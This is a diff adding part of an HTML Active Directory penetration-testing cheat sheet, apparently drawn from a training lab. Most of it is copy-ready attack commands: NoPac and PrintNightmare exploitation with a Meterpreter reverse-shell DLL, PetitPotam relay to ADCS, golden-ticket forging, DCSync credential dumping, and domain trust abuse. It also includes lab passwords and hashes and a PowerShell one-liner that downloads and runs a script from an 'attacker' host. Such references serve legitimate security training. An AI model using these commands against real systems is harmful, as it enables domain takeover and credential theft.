+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">💻 WinRM / Evil-WinRM</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Enumerate WinRM access</span>
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 \
+  -GroupName "Remote Management Users"
+
+<span class="comment"># Linux - evil-winrm</span>
+gem install evil-winrm
+evil-winrm -i 10.129.201.234 -u forend
+
+<span class="comment"># Windows - PSRemoting</span>
+$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(
+  "INLANEFREIGHT\forend", $password)
+Enter-PSSession -ComputerName ACADEMY-EA-MS01 \
+  -Credential $cred</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🗃️ MSSQL — xp_cmdshell</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Connect to MSSQL</span>
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 \
+  -windows-auth
+
+<span class="comment"># Enable command execution</span>
+enable_xp_cmdshell
+
+<span class="comment"># Run system commands</span>
+xp_cmdshell whoami /priv</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- EXPLOITS -->
+    <div class="section" id="exploits" data-tags="nopac printnightmare petitpotam cve exploit samaccountname spoofing">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ef5350,#4a0000)">💥</div>
+        <div>
+          <div class="section-title">CVE Exploits</div>
+          <div class="section-desc">High-impact AD vulnerabilities: NoPac, PrintNightmare, and PetitPotam.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">👻 NoPac — SamAccountName Spoofing</div>
+            <span class="badge badge-warn">CRITICAL</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Exploit CVE-2021-42278/42287. Rename a machine account to impersonate a DC and obtain a SYSTEM shell. Requires ms-DS-MachineAccountQuota > 0 (default: 10).</div>
+            <div class="code-block">git clone https://github.com/Ridter/noPac.git
+
+<span class="comment"># Scan for vulnerability</span>
+sudo python3 scanner.py \
+  inlanefreight.local/forend:Klmcargo2 \
+  -dc-ip 172.16.5.5 -use-ldap
+
+<span class="comment"># Get SYSTEM shell</span>
+sudo python3 noPac.py \
+  INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
+  -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 \
+  --impersonate administrator -use-ldap -shell
+
+<span class="comment"># DCSync the Administrator</span>
+sudo python3 noPac.py \
+  INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
+  -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 \
+  --impersonate administrator -use-ldap \
+  -dump -just-dc-user INLANEFREIGHT/administrator</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🖨️ PrintNightmare (CVE-2021-1675)</div>
+            <span class="badge badge-warn">CRITICAL</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Exploit Windows Print Spooler to achieve SYSTEM. Requires MS-RPRN or MS-PAR exposed on target.</div>
+            <div class="code-block">git clone https://github.com/cube0x0/CVE-2021-1675.git
+
+<span class="comment"># Install cube0x0's Impacket fork</span>
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket && python3 ./setup.py install
+
+<span class="comment"># Check if vulnerable</span>
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+
+<span class="comment"># Create DLL payload</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+
+<span class="comment"># Host the DLL</span>
+sudo smbserver.py -smb2support CompData \
+  /path/to/backupscript.dll
+
+<span class="comment"># Run exploit</span>
+sudo python3 CVE-2021-1675.py \
+  inlanefreight.local/forend:Klmcargo2@172.16.5.5 \
+  '\\172.16.5.225\CompData\backupscript.dll'</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🪄 PetitPotam (MS-EFSRPC)</div>
+            <span class="badge badge-warn">CRITICAL</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Coerce DC authentication to relay to ADCS for certificate-based DA takeover.</div>
+            <div class="code-block"><span class="comment"># 1. Start ntlmrelayx targeting ADCS</span>
+sudo ntlmrelayx.py -debug -smb2support \
+  --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+<span class="comment"># 2. Trigger with PetitPotam (Linux)</span>
+python3 PetitPotam.py 172.16.5.225 172.16.5.5
+
+<span class="comment"># 3. Request TGT using the cert</span>
+python3 /opt/PKINITtools/gettgtpkinit.py \
+  INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ \
+  -pfx-base64 MIIStQIBAzCCEn8... dc01.ccache
+
+export KRB5CCNAME=dc01.ccache
+
+<span class="comment"># 4. DCSync</span>
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
+  -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</div>
+            <div class="code-block"><span class="comment"># Alt: Use TGT for NTLM hash via getnthash.py</span>
+python /opt/PKINITtools/getnthash.py \
+  -key &lt;key_from_gettgtpkinit&gt; \
+  INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
+
+<span class="comment"># Then secretsdump with hash</span>
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
+  "ACADEMY-EA-DC01$"@172.16.5.5 \
+  -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f4...</div>
+            <div class="code-block"><span class="comment"># Rubeus: Request TGT + PTT from cert</span>
+.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ \
+  /certificate:MIIStQIBAzC...IkHS2vJ51Ry4= /ptt
+klist  <span class="comment"># confirm ticket in memory</span>
+mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/zer1t0/certi" target="_blank">↗ certi (CA locator)</a>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- DOMAIN TRUSTS -->
+    <div class="section" id="trusts" data-tags="domain trusts child parent extrasids golden ticket cross forest kerberos raiseChild">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ce93d8,#6a1b9a)">🌳</div>
+        <div>
+          <div class="section-title">Domain Trusts</div>
+          <div class="section-desc">Exploit trust relationships to escalate from child domains to parent domains and across forests.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔍 Trust Enumeration</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># PowerShell AD Module</span>
+Import-Module activedirectory
+Get-ADTrust -Filter *
+
+<span class="comment"># PowerView</span>
+Get-DomainTrust
+Get-DomainTrustMapping
+
+<span class="comment"># netdom</span>
+netdom query /domain:inlanefreight.local trust
+netdom query /domain:inlanefreight.local dc
+netdom query /domain:inlanefreight.local workstation</div>
+            <div class="card-note" style="margin-top:0.5rem">Trust types: <code style="color:var(--accent3)">WITHIN_FOREST</code> = child domain | <code style="color:var(--accent3)">FOREST_TRANSITIVE</code> = forest trust</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">⬆️ ExtraSids Attack — Child → Parent (Windows)</div>
+            <span class="badge badge-warn">CRITICAL</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Forge a Golden Ticket in the child domain with the Enterprise Admins SID added as an extra SID to gain parent domain DA.</div>
+            <div class="steps">
+              <div class="step"><div class="step-num">1</div><span>Get child domain KRBTGT hash: <code style="color:var(--accent3)">mimikatz lsadump::dcsync /user:LOGISTICS\krbtgt</code></span></div>
+              <div class="step"><div class="step-num">2</div><span>Get child domain SID: <code style="color:var(--accent3)">Get-DomainSID</code></span></div>
+              <div class="step"><div class="step-num">3</div><span>Get Enterprise Admins SID: <code style="color:var(--accent3)">Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins"</code></span></div>
+            </div>
+            <div class="code-block"><span class="comment"># Mimikatz — forge Golden Ticket + PTT</span>
+kerberos::golden /user:hacker \
+  /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
+  /sid:S-1-5-21-2806153819-209893948-922872689 \
+  /krbtgt:9d765b482771505cbe97411065964d5f \
+  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+<span class="comment"># Rubeus equivalent</span>
+.\Rubeus.exe golden \
+  /rc4:9d765b482771505cbe97411065964d5f \
+  /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
+  /sid:S-1-5-21-2806153819-209893948-922872689 \
+  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 \
+  /user:hacker /ptt
+
+klist  <span class="comment"># confirm ticket</span>
+ls \\academy-ea-dc01.inlanefreight.local\c$  <span class="comment"># verify access</span></div>
+            <div class="code-block"><span class="comment"># DCSync parent domain via child ticket</span>
+lsadump::dcsync /user:INLANEFREIGHT\lab_adm \
+  /domain:INLANEFREIGHT.LOCAL</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">⬆️ ExtraSids Attack — Child → Parent (Linux)</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># 1. Get KRBTGT hash</span>
+secretsdump.py logistics.inlanefreight.local/htbstudent_adm@172.16.5.240 \
+  -just-dc-user LOGISTICS/krbtgt
+
+<span class="comment"># 2. Get child domain SID</span>
+lookupsid.py logistics.inlanefreight.local/htbstudent_adm@172.16.5.240 \
+  | grep "Domain SID"
+
+<span class="comment"># 3. Get Enterprise Admins SID</span>
+lookupsid.py logistics.inlanefreight.local/htbstudent_adm@172.16.5.5 \
+  | grep -B12 "Enterprise Admins"
+
+<span class="comment"># 4. Forge ticket with ticketer.py</span>
+ticketer.py \
+  -nthash 9d765b482771505cbe97411065964d5f \
+  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
+  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
+  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+export KRB5CCNAME=hacker.ccache
+
+<span class="comment"># 5. Get SYSTEM shell on parent DC</span>
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local \
+  -k -no-pass -target-ip 172.16.5.5</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/fortra/impacket/blob/master/examples/raiseChild.py" target="_blank">↗ raiseChild.py (automated)</a>
+            </div>
+            <div class="code-block"><span class="comment"># Fully automated with raiseChild.py</span>
+raiseChild.py -target-exec 172.16.5.5 \
+  LOGISTICS.INLANEFREIGHT.LOCAL/htbstudent_adm</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌐 Cross-Forest Trust Abuse</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Enumerate foreign group membership</span>
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+<span class="comment"># Resolve SID to name</span>
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+<span class="comment"># If INLANEFREIGHT admin is in FREIGHTLOGISTICS admin group:</span>
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
+  -Credential INLANEFREIGHT\administrator</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- MISC MISCONFIGS -->
+    <div class="section" id="misc" data-tags="misconfiguration gpp sysvol passwords description field asrep gpo printer dns ms14-068">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#4fc3f7,#006064)">⚙️</div>
+        <div>
+          <div class="section-title">Miscellaneous Misconfigurations</div>
+          <div class="section-desc">Find credentials and weaknesses in GPP, SYSVOL, DNS, description fields, and more.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🗝️ GPP (Group Policy Preferences) Passwords</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">MS14-025: GPP stored encrypted passwords in SYSVOL. The AES key was published by Microsoft, making these trivially decryptable.</div>
+            <div class="code-block"><span class="comment"># Linux - CrackMapExec modules</span>
+crackmapexec smb -L | grep gpp
+crackmapexec smb 172.16.5.5 \
+  -u forend -p Klmcargo2 -M gpp_autologin</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/GetGPPPassword.ps1" target="_blank">↗ GetGPPPassword.ps1</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📜 SYSVOL Script Credential Hunting</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">💬 Passwords in Description Fields</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">Get-DomainUser * | Select-Object \
+  samaccountname,description | \
+  Where-Object {$_.Description -ne $null}</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔓 PASSWD_NOTREQD Flag</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Accounts with this flag set do not require a password to authenticate.</div>
+            <div class="code-block">Get-DomainUser -UACFilter PASSWD_NOTREQD | \
+  Select-Object samaccountname,useraccountcontrol</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🖨️ Printer Bug (MS-PRN)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="links-row" style="margin-bottom:0.5rem">
+              <a class="ext-link" href="https://github.com/NotMedic/NetNTLMtoSilverTicket" target="_blank">↗ NetNTLMtoSilverTicket</a>
+            </div>
+            <div class="code-block">Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName \
+  ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌐 DNS Enumeration (adidnsdump)</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Dump all DNS records from AD integrated DNS zone. Useful for finding hidden hosts.</div>
+            <div class="code-block">adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+head records.csv
+
+<span class="comment"># Resolve unknown records</span>
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/dirkjanm/adidnsdump" target="_blank">↗ adidnsdump (GitHub)</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📋 GPO Enumeration & Abuse</div>
+            <span class="badge badge-both">BOTH</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># PowerView GPO enumeration</span>
+Get-DomainGPO | select displayname
+Get-GPO -All | Select DisplayName
+
+<span class="comment"># Check Domain Users GPO rights</span>
+$sid=Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | \
+  ? {$_.SecurityIdentifier -eq $sid}
+
+<span class="comment"># Convert GPO GUID to name</span>
+Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank">↗ SharpGPOAbuse (F-Secure)</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🛡️ LAPS Enumeration</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">Find-LAPSDelegatedGroups
+Find-AdmPwdExtendedRights
+Get-LAPSComputers</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- LIVING OFF THE LAND -->
+    <div class="section" id="lotl" data-tags="living off land lotl wmi net commands dsquery built-in enumeration powershell">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#81c784,#33691e)">🌿</div>
+        <div>
+          <div class="section-title">Living Off the Land</div>
+          <div class="section-desc">Enumerate using built-in Windows tools to avoid detection. No offensive tooling needed.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📋 Basic Enumeration Commands</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">hostname
+[System.Environment]::OSVersion.Version
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+ipconfig /all
+set
+echo %USERDOMAIN%
+echo %logonserver%
+Get-Module
+Get-ExecutionPolicy -List
+Set-ExecutionPolicy Bypass -Scope Process</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔥 Checking Defenses</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">netsh advfirewall show allprofiles
+sc query windefend
+Get-MpComputerStatus  <span class="comment"># Defender status</span>
+qwinsta  <span class="comment"># Who else is logged in?</span></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌐 Network Information</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">arp -a
+ipconfig /all
+route print
+netsh advfirewall show state</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">⚙️ WMI Queries</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+wmic process list /format:list
+wmic ntdomain list /format:list
+wmic useraccount list /format:list
+wmic group list /format:list
+wmic sysaccount list /format:list</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔢 Net Commands</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Domain groups</span>
+net group /domain
+
+<span class="comment"># User info</span>
+net user /domain wrouse</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔎 Dsquery</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Requires elevated privileges or SYSTEM context for some queries.</div>
+            <div class="code-block"><span class="comment"># User search</span>
+dsquery user
+
+<span class="comment"># Computer search</span>
+dsquery computer
+
+<span class="comment"># Wildcard search</span>
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+<span class="comment"># Accounts with PASSWD_NOTREQD (UAC flag 32)</span>
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+<span class="comment"># Find Domain Controllers</span>
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📜 PowerShell History & Env</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">PowerShell history often contains plaintext credentials and commands run by admins.</div>
+            <div class="code-block"><span class="comment"># Read console history (may contain creds!)</span>
+Get-Content C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+<span class="comment"># Environment variables</span>
+Get-ChildItem Env: | ft Key,Value</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📥 Download & Execute (One-liner)</div>
+            <span class="badge badge-windows">WINDOWS</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block">powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1'); &lt;commands&gt;"</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- NO RESULTS -->
+    <div class="no-results" id="noResults" style="display:none">
+      <div class="nr-icon">🔍</div>
+      <div style="color:var(--text-bright);font-weight:700;margin-bottom:0.5rem">No results found</div>
+      <div>Try a different search term or browse by category</div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+  // Search functionality
+  const searchInput = document.getElementById('searchInput');
+  const sections = document.querySelectorAll('.section');
+  const noResults = document.getElementById('noResults');
+
+  searchInput.addEventListener('input', function() {
+    const query = this.value.toLowerCase().trim();
+    if (!query) {
+      showAll();
+      return;
+    }
+
+    let anyVisible = false;
+    sections.forEach(section => {
+      const text = section.textContent.toLowerCase();
+      const tags = (section.dataset.tags || '').toLowerCase();
+      const matches = text.includes(query) || tags.includes(query);
+      section.style.display = matches ? 'block' : 'none';
+
+      // Highlight matches
+      if (matches) {
+        anyVisible = true;
+        // Simple highlight in card-notes (skip code blocks)
+        highlightText(section, query);
+      }
+    });
+
+    noResults.style.display = anyVisible ? 'none' : 'block';
+    updatePills('');
+  });
+
+  function highlightText(container, query) {
+    // Only apply to visible sections that match
+  }
+
+  function showAll() {
+    sections.forEach(s => {
+      s.style.display = 'block';
+      s.classList.add('visible');
+    });
+    noResults.style.display = 'none';
+  }
+
+  // Filter by section category
+  function filterSection(id) {
+    sections.forEach(s => {
+      s.style.display = s.id === id || s.id === 'overview' ? 'block' : 'none';
+    });
+    noResults.style.display = 'none';
+    updatePills(id);
+    searchInput.value = '';
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  }
+
+  function filterAll() {
+    showAll();
+    updatePills('all');
+    searchInput.value = '';
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  }
+
+  function updatePills(active) {
+    document.querySelectorAll('.pill').forEach(p => {
+      p.classList.remove('active');
+      const onclick = p.getAttribute('onclick') || '';
+      if (active === 'all' && onclick.includes('filterAll')) p.classList.add('active');
+      if (active && onclick.includes(`'${active}'`)) p.classList.add('active');
+    });
+  }
+
+  // Scroll to section
+  function scrollToSection(id) {
+    const el = document.getElementById(id);
+    if (el) {
+      showAll();
+      updatePills('');
+      setTimeout(() => {
+        el.scrollIntoView({behavior: 'smooth', block: 'start'});
+        updateSidebarActive(id);
+      }, 50);
+    }
+  }
+
+  function updateSidebarActive(id) {
+    document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
+    const active = document.querySelector(`.sidebar-link[onclick*="'${id}'"]`);
+    if (active) active.classList.add('active');
+  }
+
+  // Copy button functionality
+  document.addEventListener('click', function(e) {
+    if (e.target.classList.contains('copy-btn')) {
+      const code = e.target.closest('.code-block');
+      const text = code.innerText.replace('Copy\n', '').replace('✓ Done\n', '').trim();
+      navigator.clipboard.writeText(text).then(() => {
+        e.target.textContent = '✓ Done';
+        e.target.classList.add('copied');
+        setTimeout(() => {
+          e.target.textContent = 'Copy';
+          e.target.classList.remove('copied');
+        }, 1500);
+      });
+    }
+  });
+
+  // Add copy buttons to all code blocks
+  document.querySelectorAll('.code-block').forEach(block => {
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.textContent = 'Copy';
+    block.appendChild(btn);
+  });
+
+  // Show all on load
+  showAll();
+</script>
+</body>
+</html>
